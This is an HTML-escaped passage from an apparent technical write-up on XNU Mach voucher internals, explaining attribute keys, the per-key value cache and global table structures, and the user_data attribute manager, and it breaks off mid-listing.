 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_PTHPRIORITY &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_TEST &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN MACH_VOUCHER_ATTR_KEY_TEST&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_inline_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;in an &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;has 8 entries. But of those, only four are actually supported and have any associated functionality. The ATM voucher attributes are deprecated and the code supporting them is gone so only IMPORTANCE (2), BANK (3), PTHPRIORITY (4) and USER_DATA (7) are valid keys. There&amp;#39;s some confusion (perhaps on my part) about when exactly you should use the term key and when attribute; I&amp;#39;ll use them interchangeably to refer to these key values and the corresponding &amp;quot;types&amp;quot; of values which they manage. More on that later.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;BGLtzooHlW-c18 BGLtzooHlW-c5&quot; id=&quot;h.z3ifj5rlshxh&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c20&quot;&gt;Values&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Each entry in a voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_index_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.adadf70a01ef64fd38d16dcc040ece0a87975524&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.2&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;typedef&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;natural_t iv_index_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Each value is again an index; this time into a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c14&quot;&gt;per-key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;cache of values, abstracted as a &amp;quot;Voucher Attribute Cache Control Object&amp;quot; represented by this structure:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.34f3e7551949b227b144fa7c23780e56054cf088&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.3&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ipc_voucher_attr_control &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;os_refcnt_t &amp;nbsp; ivac_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;boolean_t &amp;nbsp; &amp;nbsp; ivac_is_growing&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* is the table being grown */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_entry_t &amp;nbsp;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* table of voucher attr value entries */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* size of the attr value table */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_init_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* size of the attr value table */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_freelist&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* index of the first free element */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ipc_port_t &amp;nbsp; &amp;nbsp;ivac_port&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* port for accessing the cache control &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;lck_spin_t &amp;nbsp; &amp;nbsp;ivac_lock_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* key index for this value */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;These are accessed indirectly via another global table:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.458710f747bcd533915a3238dbd017b636296741&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.4&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ipc_voucher_global_table_element iv_global_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;(Again, the comments in the code indicate that in the future that this table may grow in size and allow attributes to be managed in userspace, but for now it&amp;#39;s just a fixed size array.)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Each element in that table has this structure:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.f065f1b068e3aad8a11a5356fab0dbe3d10ab90a&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.5&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;typedef&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ipc_voucher_global_table_element &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_manager_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivgte_manager&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_control_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivgte_control&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivgte_key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ipc_voucher_global_table_element&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Both the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_global_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;and each voucher&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;are indexed by &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;(key-1)&lt;/span&gt;&lt;span&gt;, not &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;key&lt;/span&gt;&lt;span&gt;, so the userdata entry is &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;[6]&lt;/span&gt;&lt;span&gt;, not &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;[7]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;, even though the array still has 8 entries.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_voucher_attr_control_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;provides an abstract interface for managing &amp;quot;values&amp;quot; and the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_voucher_attr_manager_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;provides the &amp;quot;type-specific&amp;quot; logic to implement the semantics of each type (here by type I mean &amp;quot;key&amp;quot; or &amp;quot;attr&amp;quot; type.) Let&amp;#39;s look more concretely at what that means. Here&amp;#39;s the definition of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_voucher_attr_manager_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.467ea53fdb41a42817b67f1b1b14674c0e55d04b&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.6&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ipc_voucher_attr_manager &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_attr_manager_release_value_t &amp;nbsp; &amp;nbsp;ivam_release_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_attr_manager_get_value_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_get_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_attr_manager_extract_content_t &amp;nbsp;ivam_extract_content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_attr_manager_command_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_attr_manager_release_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_attr_manager_flags &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_flags&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam_flags&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;int&lt;/span&gt;&lt;span&gt;&amp;nbsp;containing some flags; the other five fields are function pointers which define the semantics of the particular attr type. Here&amp;#39;s the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_voucher_attr_manager&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure for the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;type:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.24cf1225ae06e4faa7d9d726ded665d4facb053f&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.7&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ipc_voucher_attr_manager user_data_manager &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_release_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp;user_data_release_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_get_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_data_get_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_extract_content &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;user_data_extract_content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_command &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_data_command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
